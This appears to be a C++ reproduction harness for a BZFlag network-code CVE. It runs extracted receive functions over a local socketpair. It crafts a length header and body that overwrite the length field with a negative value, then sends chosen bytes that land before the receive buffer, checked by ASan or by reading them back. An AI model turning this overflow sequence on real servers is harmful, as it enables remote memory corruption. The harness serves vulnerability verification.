// BZFlag CVE-2026-130849 harness. The two RxStatus functions below are
// extracted verbatim from the pinned NetHandler.cxx by gen_functions.py.
// Everything else here is a minimal stub: one socketpair is the "wire",
// the fake NetHandler keeps the pinned member order (tcpmsg then tcplen),
// and the plain build places that object inside an arena so writes before
// tcpmsg can be read back at a known offset.
#include <arpa/inet.h>
#include <cerrno>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <new>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

#ifdef HARNESS_PLAIN_READBACK
#define ARENA_MODE 1
#else
#define ARENA_MODE 0
#endif
#if !ARENA_MODE
extern "C" void __asan_poison_memory_region(const volatile void *addr, size_t size);
#endif

const int MaxPacketLen = 1024;            // include/Protocol.h:47 (pinned)
const uint16_t MsgUDPLinkEstablished = 0x6f67; // include/Protocol.h:184

enum RxStatus { ReadAll, ReadPart, ReadHuge, ReadReset, ReadError, ReadDiscon };

struct FakeInfo { const char *getCallSign() const { return "attacker"; } };

class NetHandler {
public:
    char tcpmsg[MaxPacketLen];            // include/NetHandler.h:236 (pinned)
    int tcplen;                           // include/NetHandler.h:238 (pinned)
    int fd;
    bool closed;
    int playerIndex;
    bool acceptUDP;
    bool udpout;
    FakeInfo *info;

    NetHandler() : tcplen(0), fd(-1), closed(false), playerIndex(0),
                   acceptUDP(true), info(NULL) {}
    RxStatus tcpReceive();
    RxStatus receive(size_t length, bool *retry = NULL);
    void closing() {}
};

static void logDebugMessage(int, const char *, ...) {}
static void callNetworkDataLog(bool, bool, const unsigned char *, unsigned int, void *) {}
static int getErrno() { return errno; }
static const void *nboUnpackUShort(const void *b, uint16_t &v)
{
    const unsigned char *p = (const unsigned char *)b;
    v = (uint16_t)((p[0] << 8) | p[1]);
    return p + 2;
}

#include "net_functions.inc"

static void die(const char *msg) { perror(msg); exit(2); }

int main()
{
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) die("socketpair");

    unsigned char *arena = NULL;
    unsigned char *heap_base = NULL;
    NetHandler *h = NULL;
#if ARENA_MODE
    arena = (unsigned char *)mmap(NULL, 8192, PROT_READ | PROT_WRITE,
                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (arena == MAP_FAILED) die("mmap");
    memset(arena, 0, 8192);
    h = new (arena + 4096) NetHandler();
#else
    // A mapped, ASan-poisoned adjacent region makes the genuine negative
    // recv() write observable; the plain build uses a real adjacent object
    // for chosen-byte readback instead.
    heap_base = new unsigned char[8192];
    __asan_poison_memory_region(heap_base, 3072);
    h = new (heap_base + 4096) NetHandler();
#endif
    h->fd = sv[0];
    h->info = new FakeInfo();

    // Wire stage 1: a 4-byte framing header declaring len=1024 (one byte
    // more than the payload may occupy once the header is counted), followed
    // by 1024 body bytes whose final four are the little-endian int -4096.
    unsigned char wire[4 + 1024];
    memset(wire, 0x41, sizeof(wire));
    wire[0] = 0x04; wire[1] = 0x00;       // len = 1024, big endian
    wire[2] = 0x12; wire[3] = 0x34;       // arbitrary message code
    int32_t corrupt = -4096;
    memcpy(wire + 4 + 1020, &corrupt, 4); // bytes that land in tcplen
    if (write(sv[1], wire, sizeof(wire)) != (ssize_t)sizeof(wire)) die("write stage1");

    RxStatus s1 = h->tcpReceive();
    printf("stage1_status=%d stage1_tcplen=%d\n", (int)s1, h->tcplen);

    // Wire stage 2: the corrupted (negative) tcplen is now the recv()
    // destination offset. Send only 64 bytes: enough to observe chosen bytes
    // at a chosen relative offset without depending on a full-length read.
    unsigned char payload[64];
    for (int i = 0; i < 64; ++i)
        payload[i] = (unsigned char)(i < 16 ? 0x5a : i < 32 ? 0x41 : i < 48 ? 0x42 : 0x43);
    if (write(sv[1], payload, sizeof(payload)) != (ssize_t)sizeof(payload)) die("write stage2");

    int off_before = h->tcplen;
    RxStatus s2 = h->tcpReceive();
    printf("stage2_status=%d stage2_tcplen=%d stage2_offset=%d\n",
           (int)s2, h->tcplen, off_before);
    printf("stage2_errno=%d\n", errno);
#if ARENA_MODE
    for (int base = 0; base < 64; base += 16) {
        const unsigned char *p = (unsigned char *)h->tcpmsg + off_before + base;
        printf("readback+%d=", base);
        for (int j = 0; j < 8; ++j) printf("%02x", p[j]);
        printf("\n");
    }
#endif
    delete h->info;
    if (heap_base) delete[] heap_base;
    close(sv[0]);
    close(sv[1]);
    return 0;
}
